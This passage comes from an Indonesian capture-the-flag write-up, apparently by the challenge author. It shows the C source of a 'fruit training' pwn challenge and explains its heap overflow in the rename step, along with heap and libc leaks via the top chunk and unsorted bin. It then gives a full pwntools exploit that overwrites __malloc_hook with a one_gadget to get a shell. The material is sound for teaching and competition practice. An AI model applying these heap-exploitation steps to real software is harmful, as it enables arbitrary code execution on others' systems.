         puts("  ,--./,-.");
         puts(" / #      \\");
         puts("|          |");
         puts(" \\        /");
         puts("  `.____,'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into an orange!");
      return;
   }

   void train_fruit()
   {
      int fruit_number;

      printf("You have %d fruits\n", number_of_fruits);
      puts("Which fruit do you want to train?");
      scanf("%d", &fruit_number);
      getchar();
      if(0 > fruit_number || number_of_fruits-1 < fruit_number)   {
         puts("That fruit doesnt exist yet...");
         return;
      }
      struct Fruit *fruit_to_train = get_fruit(fruit_number);
      if(fruit_to_train->level >= 3)   {
         puts("This fruit can no longer train!");
         return;
      }
      fruit_to_train->coolness += rand() % 10 + 1;
      fruit_to_train->tastiness += rand() % 10 + 1;
      if(fruit_to_train->coolness >= 50 && fruit_to_train->tastiness >= 50)   {
         fruit_to_train->coolness = 0;
         fruit_to_train->tastiness = 0;
         puts("Whats this? This fruit is evolving?!");
         if(fruit_to_train->level == 0)   {
            evolve_berry();
         }
         else if(fruit_to_train->level == 1) {
            evolve_apple();
         }
         else if(fruit_to_train->level == 2) {
            evolve_orange();
         }
         fruit_to_train->level++;
         puts("Would you like to rename this fruit? (y/n)");
         char choice[5];
         fgets(choice, 5, stdin);
         if(strstr(choice, "y")) {
            puts("How long do you want this fruit's name to be? (Max 4096 characters)");
            int length;
            scanf("%d", &length);
            getchar();
            if(length > 4096) {
               puts("NO! BAD!");
               exit(-1);
            }
            char new_name[length];
            puts("What do you want this fruit's name to be?");
            __read_chk(0, new_name, length);
            strncpy(fruit_to_train->name, new_name, length);
            return;
         }
         else if(strstr(choice, "n"))  {
            puts("Okay then");
            return;
         }
         else  {
            puts("Dont play games with me >:(");
            exit(-1);
         }
      }
      puts("Fruit Trained!");
      return;
   }

   void print_fruit(struct Fruit *fruit_to_print)
   {
      puts("==================================================");
      printf("Number: %d\n", fruit_to_print->number);
      printf("Name: %s", fruit_to_print->name);
      printf("Coolness: %d\n", fruit_to_print->coolness);
      printf("Tastiness: %d\n", fruit_to_print->tastiness);
      printf("Level: %d\n", fruit_to_print->level);
      puts("==================================================");
      return;  
   }

   void list_fruits()
   {
      if(number_of_fruits == 0)  {
         puts("You have no fruits yet silly!");
         return;
      }
      struct Fruit *fruit_to_print = first_fruit;
      while(fruit_to_print->next_fruit != NULL) {
         print_fruit(fruit_to_print);
         fruit_to_print = fruit_to_print->next_fruit;
      }
      print_fruit(fruit_to_print);
      return;
   }

   int main(int argc, char* argv[], char** env)
   {
      setup();
      int choice;
      while(1) {
         menu();
         scanf("%d", &choice);
         getchar();
         if(choice == 1)   {
            make_fruit();
         }
         else if (choice == 2)   {
            train_fruit();
         }
         else if (choice == 3)   {
            list_fruits();
         }
         else  {
            puts("You gave up on your fruits..."); exit(0);
         }
      }
   }
```

Terlihat banyak, tapi sebenarnya ini soal make/edit/see sederhana. Aku akan biarkan anda cara kerjanya, tapi ini rangkuman dikit:

*  make_fruit -> Anda dapat membuat buah baru dimana buah baru memiliki atribut coolness, tastiness, number, name, pointer ke buah berikut, dan level
*  train_fruit -> ini merupakan mekanisme edit, dimana anda dapat melatih buah anda dan setelah beberapa waktu (random) dia bisa naik level dan evolusi. Ketika evolusi anda dapat mengubah namanya.
*  list_fruits -> tampilkan semua buah yang ada sekarang (sebuah linked list yang mengiterasi hingga null)

### Bug
Bugnya dapat ditemukan ditemukan dalam mekanisme evolusi:

```c
fruit_to_train->coolness += rand() % 10 + 1;
   fruit_to_train->tastiness += rand() % 10 + 1;
   if(fruit_to_train->coolness >= 50 && fruit_to_train->tastiness >= 50)   {
      fruit_to_train->coolness = 0;
      fruit_to_train->tastiness = 0;
      puts("Whats this? This fruit is evolving?!");
      if(fruit_to_train->level == 0)   {
         evolve_berry();
      }
      else if(fruit_to_train->level == 1) {
         evolve_apple();
      }
      else if(fruit_to_train->level == 2) {
         evolve_orange();
      }
      fruit_to_train->level++;
      puts("Would you like to rename this fruit? (y/n)");
      char choice[5];
      fgets(choice, 5, stdin);
      if(strstr(choice, "y")) {
         puts("How long do you want this fruit's name to be? (Max 4096 characters)");
         int length;
         scanf("%d", &length);
         getchar();
         if(length > 4096) {
            puts("NO! BAD!");
            exit(-1);
         }
         char new_name[length];
         puts("What do you want this fruit's name to be?");
         __read_chk(0, new_name, length);
         strncpy(fruit_to_train->name, new_name, length);
         return;
      }
      else if(strstr(choice, "n"))  {
         puts("Okay then");
         return;
      }
      else  {
         puts("Dont play games with me >:(");
         exit(-1);
      }
   }
```

Dapat dilihat bahwa setelah beberapa waktu, coolness dan tastiness berdua akan lebih dari 50, setelah itu anda dapat mengubah nama dari buah yang sedang dilatih. Akan tetapi, panjang dari nama yang baru bisa jadi lebih besar dari panjang nama sebelumnya. Ini mengakibatkan heap overflow.

### Mendapatkan heap leak
Setiap kali kita allokasikan buah yang baru, namanya merupakan pointer ke sebuah array karakter, dimana array tersebut terletak didalam heap. Dengan mengalokasikan 2 buah dan membuat nama baru untuk buah pertama sehingga bertepatan dengan pointer nama buah kedua, kita bisa mendapatkan sebuah heap leak.

### Mendapatkan libc leak
Dengan mengubah ukuran dari top chunk menjadi ukuran tertentu, kita dapat memanggil fungsi free(). Gimana caranya? Ketika ukuran dari top chunk lebih kecil dari nilai yang ingin kita allokasikan, top chunk tersebut akan difree dan mmap akan dipanggil, sehingga arena baru akan dibuat. Jika ukuran dari top chunk pada saat itu didalam ukuran small/large chunk, chunk tersebut akan difree dan dipindahkan ke unsorted bin. Nah untuk chunk yang difree dan ditempatkan ke unsorted bin, pointer fd dan bk berdua akan menunjuk ke main arena, yang terdapat di libc.

Dengan menkombinasikan kedua teknik diatas, kita bisa mendapatkan kedua leak hanya dengan 2 buah and 3 evolusi.

### Terus ngapain
Nah mengubah pointer nama tidak hanya bisa menjadi baca semaunya, tapi bisa juga digunakan untuk menulis kemana pun. Dengan mengubah \_\_malloc\_hook maupun \_\_free\_hook, dengan mudah kita bisa mendapatkan shell.

Ini exploit lengkap aku:
```python
import sys
from pwn import *

if '--local' in sys.argv:
   p = process('./soal')
else:
   p = remote(sys.argv[1], int(sys.argv[2]))

def new_fruit(size, name):
   p.recvuntil("choice", timeout=2)
   p.sendline('1')
   p.sendlineafter(")", str(size))
   p.sendlineafter("?", name)

def train_fruit(num):
   p.sendline('2')
   p.sendlineafter("?\n", num)

def list_fruits():
   p.recvuntil("choice")
   p.sendlineafter(":", '3')
   p.recv(1024)

new_fruit(0x50, "Zafir")
list_fruits()

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '96')
payload = p64(0x0101010101010101)*11 + p64(0xf71)
p.sendlineafter("be?", payload)

new_fruit(0x1000, "A"*0x8)

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendline('y')
p.sendline('112')
payload = p64(0x0101010101010101)*14
p.sendafter("be?", payload)

p.recv(1024)
list_fruits()
heap_leak = int(p.recvuntil('\x55')[-6:][::-1].encode('hex'), 16)

print "HEAP LEAK"
print hex(heap_leak)

heap_offset = -135120
heap_offset_2 = -134976

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '120')
payload = p64(0x0101010101010101)*14 + p64(heap_leak+heap_offset_2)
p.sendlineafter("be?", payload)

list_fruits()
p.recvuntil('Name: ')
p.recvuntil('Name: ')
main_arena = int(p.recv(1024)[:6][::-1].encode('hex'), 16)
print "MAIN ARENA"
print hex(main_arena)

libc_base = main_arena + -3951480
one_gadget = libc_base + 0xf02a4
malloc_hook = libc_base + 0x3c4b10

new_fruit(0x50, "one")
new_fruit(0x50, "two")

l = ''
while "evolving" not in l: 
   train_fruit('2')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '120')
payload = p64(0x0101010101010101)*14 + p64(malloc_hook)
p.sendlineafter("be?", payload)

train_fruit('3')
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '8')
payload = p64(one_gadget)
p.sendlineafter("be?", payload)

p.sendline("1")

p.interactive()
```

### Feedback untuk diri sendiri
Aku ingin minta maaf jika soal saya menjadi sangat jelek. Aku cepat-cepat ingin selesai sehingga I/O nya menjadi buruk, tapi sekaligus aku terlalu semangat sehingga terdapat fungsi bodoh seperti usleep(), rand(), dan alarm(). Aku janji untuk kedepannya aku akan coba untuk membuat soal yang lebih bagus dan mengujinya secara penuh kedepannya. Selamat bagi tim yang solve, sayangnya aku tidak sempat ke final sebab aku jatuh sakit setelah kualifikasi Cyber Jawara.
